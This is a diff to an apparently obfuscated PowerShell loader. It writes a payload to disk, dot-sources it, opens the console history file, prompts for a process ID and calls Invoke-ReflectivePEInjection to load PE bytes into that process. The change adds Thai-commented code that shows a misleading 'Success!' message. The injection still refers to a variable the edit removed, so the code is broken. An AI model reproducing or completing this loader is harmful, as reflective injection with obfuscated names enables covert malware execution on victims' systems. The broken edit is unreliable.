@@ -41,8 +41,18 @@ $_0xA77 | Set-Content $_0xC11 -Encoding UTF8
 
 . $_0xC11
 
-$_0x2AA = Read-Host (@("Enter"," PID") -join "")
+# 1. ล้างหน้าจอ (ขึ้นหน้าใหม่)
+Clear-Host 
 
+# 2. รับค่าจากผู้ใช้งาน
+$MyPID = Read-Host "Enter PID"
+
+# 3. ตรวจสอบว่าใส่ข้อมูลมาหรือไม่ แล้วแสดงข้อความสำเร็จ
+if ($MyPID) {
+    Write-Host "Success! Input received: $MyPID" -ForegroundColor Green
+} else {
+    Write-Host "No input provided." -ForegroundColor Red
+}
 start $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
 Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
